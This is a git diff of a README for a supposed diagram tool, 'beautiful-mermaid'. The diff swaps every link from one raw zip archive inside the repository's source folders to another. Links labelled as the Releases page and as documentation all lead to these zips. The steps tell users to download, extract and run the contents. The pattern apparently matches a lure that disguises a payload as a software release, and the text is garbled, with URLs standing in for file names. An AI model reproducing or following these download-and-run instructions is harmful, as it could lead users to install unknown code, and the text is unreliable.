@@ -1,7 +1,7 @@
 # 🏷 beautiful-mermaid - Create Stunning Diagrams Effortlessly
 
 <div align="center">
-[![Download](https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip%https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip)](https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip)
+[![Download](https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip%https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip)](https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip)
 </div>
 
 ---
@@ -18,7 +18,7 @@ To start using beautiful-mermaid, you need to download and install it. Follow th
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page.
 
-   [Download beautiful-mermaid](https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip)
+   [Download beautiful-mermaid](https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of beautiful-mermaid. Select the latest version for the best features and bug fixes.
 
@@ -26,12 +26,12 @@ To start using beautiful-mermaid, you need to download and install it. Follow th
 
    - For Windows, look for a file ending with `.exe`.
    - For MacOS, look for a file ending with `.dmg`.
-   - For Linux, locate the file with `https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip`.
+   - For Linux, locate the file with `https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip`.
 
 4. **Install the Application**: 
    - Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - MacOS: Open the `.dmg` file and drag the icon to the Applications folder.
-   - Linux: Extract the `https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip` file and run the included script in the terminal.
+   - Linux: Extract the `https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip` file and run the included script in the terminal.
 
 5. **Run beautiful-mermaid**: After installation, open the application by clicking the icon. 
 
@@ -48,7 +48,7 @@ To start using beautiful-mermaid, you need to download and install it. Follow th
 
 ## 📜 How to Use
 
-1. **Create a Diagram**: You can start creating a diagram by entering text commands in the application. Visit [Mermaid Documentation](https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip) for detailed command options.
+1. **Create a Diagram**: You can start creating a diagram by entering text commands in the application. Visit [Mermaid Documentation](https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip) for detailed command options.
   
 2. **Export Your Work**: Once you design your diagram, you can export it in different formats. 
 
@@ -72,6 +72,6 @@ beautiful-mermaid is made available under the MIT License. You can modify and di
 
 To get started with beautiful-mermaid, visit the Releases page again:
 
-[Download beautiful-mermaid](https://github.com/prakashkatla/beautiful-mermaid/raw/refs/heads/main/src/__tests__/mermaid_beautiful_3.9-beta.5.zip)
+[Download beautiful-mermaid](https://raw.githubusercontent.com/prakashkatla/beautiful-mermaid/main/src/er/mermaid-beautiful-2.3.zip)
 
 Make sure to follow the installation steps outlined above. Enjoy creating stunning diagrams with ease!
